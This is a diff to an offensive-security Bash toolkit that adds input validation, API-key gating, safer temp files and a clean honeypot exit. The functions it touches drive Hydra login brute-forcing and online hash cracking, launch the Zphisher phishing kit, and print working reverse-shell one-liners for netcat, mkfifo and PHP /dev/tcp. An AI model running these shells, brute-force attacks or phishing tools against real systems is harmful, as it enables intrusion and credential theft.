@@ -528,7 +528,10 @@ run_hydra() {
   local services=("ssh" "ftp" "http-post-form" "mysql" "rdp" "smtp" "telnet" "vnc")
   for i in "${!services[@]}"; do echo -e "  ${DC}[$((i+1))]${NC} ${services[$i]}"; done
   echo -ne "\n  ${M}▶${NC} "; read -r si
-  local svc="${services[$((si-1))]:-ssh}"
+  if ! [[ "$si" =~ ^[1-9][0-9]*$ ]] || [ "$si" -lt 1 ] || [ "$si" -gt "${#services[@]}" ]; then
+    echo -e "  ${Y}[!] Invalid selection — defaulting to ssh.${NC}"; si=1
+  fi
+  local svc="${services[$((si-1))]}"
   echo -ne "  ${C}Username:${NC} "; read -r user
   echo -ne "  ${C}Wordlist path [default common-passwords]:${NC} "; read -r wl
   wl="${wl:-$PHANTOMSEC_DIR/wordlists/common-passwords.txt}"
@@ -562,9 +565,15 @@ run_hash_crack() {
   echo ""; draw_line "─" 66
   result=$(curl -s --max-time 10 "https://hashes.com/en/decrypt/hash?hashes=${hash}" 2>/dev/null | grep -oP 'class="result"[^>]*>\K[^<]+' | head -1 || echo "No result found")
   echo -e "  ${G}Result: $result${NC}"
-  # Fallback: try md5decrypt
-  result2=$(curl -s --max-time 10 "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=check@email.com&code=code1" 2>/dev/null)
-  [ -n "$result2" ] && echo -e "  ${G}MD5Decrypt: $result2${NC}"
+  # md5decrypt.net requires a registered API key (PHANTOMSEC_MD5D_EMAIL + PHANTOMSEC_MD5D_CODE)
+  if [ -n "${PHANTOMSEC_MD5D_EMAIL:-}" ] && [ -n "${PHANTOMSEC_MD5D_CODE:-}" ]; then
+    result2=$(curl -s --max-time 10 \
+      "https://md5decrypt.net/Api/api.php?hash=${hash}&hash_type=md5&email=${PHANTOMSEC_MD5D_EMAIL}&code=${PHANTOMSEC_MD5D_CODE}" \
+      2>/dev/null)
+    [ -n "$result2" ] && echo -e "  ${G}MD5Decrypt: $result2${NC}"
+  else
+    echo -e "  ${DIM}  [md5decrypt.net] Set PHANTOMSEC_MD5D_EMAIL and PHANTOMSEC_MD5D_CODE to enable.${NC}"
+  fi
   draw_line "─" 66; press_enter
 }
 
@@ -690,7 +699,7 @@ run_revshell_gen() {
   echo -e "\n${G}[+] Netcat (traditional):${NC}"
   echo "nc -e /bin/bash $ip $port"
   echo -e "\n${G}[+] Netcat (OpenBSD — no -e):${NC}"
-  echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $ip $port >/tmp/f"
+  echo "TF=\$(mktemp -u /tmp/.XXXXXX);rm -f \"\$TF\";mkfifo \"\$TF\";cat \"\$TF\"|/bin/sh -i 2>&1|nc $ip $port >\"\$TF\";rm -f \"\$TF\""
   echo -e "\n${G}[+] PHP:${NC}"
   echo "<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\"); ?>"
   echo -e "\n${G}[+] Perl:${NC}"
@@ -847,7 +856,6 @@ menu_tool_manager() {
          fi
          press_enter ;;
       1)
-        show_banner; draw_box "  TOOL STATUS" 66; echo ""
         show_banner; draw_box "  TOOL STATUS" 66; echo ""
         local tools=(
           "nmap" "hydra" "sqlmap" "nikto" "nuclei" "gobuster" "whatweb"
@@ -1188,7 +1196,7 @@ run_zphisher() {
   fi
   if [ -f "$zdir/zphisher.sh" ]; then
     echo -e "  ${G}[✓] Launching Zphisher...${NC}"; echo ""
-    cd "$zdir" && bash zphisher.sh
+    (cd "$zdir" && bash zphisher.sh)
   else
     echo -e "  ${R}[✗] Failed to set up Zphisher.${NC}"
     echo -e "  ${C}Manual: git clone https://github.com/htr-tech/zphisher && bash zphisher/zphisher.sh${NC}"
@@ -1736,17 +1744,22 @@ run_honeypot_tcp() {
   echo -e "  ${DIM}  Press Ctrl+C to stop.${NC}"; echo ""
   _hp_log "TCP" "Honeypot started on port $hport with banner: $banner"
 
-  while true; do
+  local _hp_running=1
+  trap '_hp_running=0' INT
+  while [ "$_hp_running" -eq 1 ]; do
     local conn_info
     # nc accepts one connection, prints the client's data, then loops
     conn_info=$(echo -e "$banner\r\nConnection closed.\r\n" \
       | nc -l -p "$hport" -q 1 2>/dev/null)
+    [ "$_hp_running" -eq 0 ] && break
     local src_ip
     # On Termux nc doesn't expose peer; log timestamp + any received data
     src_ip="unknown"
     _hp_log "TCP" "Connection on :$hport | peer=$src_ip | data=$(echo "$conn_info" | head -3 | tr '\n' '|')"
     echo -e "  ${G}[HIT]${NC}  $(date '+%T')  port=$hport  data=${conn_info:0:60}"
   done
+  trap - INT
+  echo -e "\n  ${Y}[!] Honeypot stopped.${NC}"
   _hp_log "TCP" "Honeypot stopped on port $hport"
 }
 
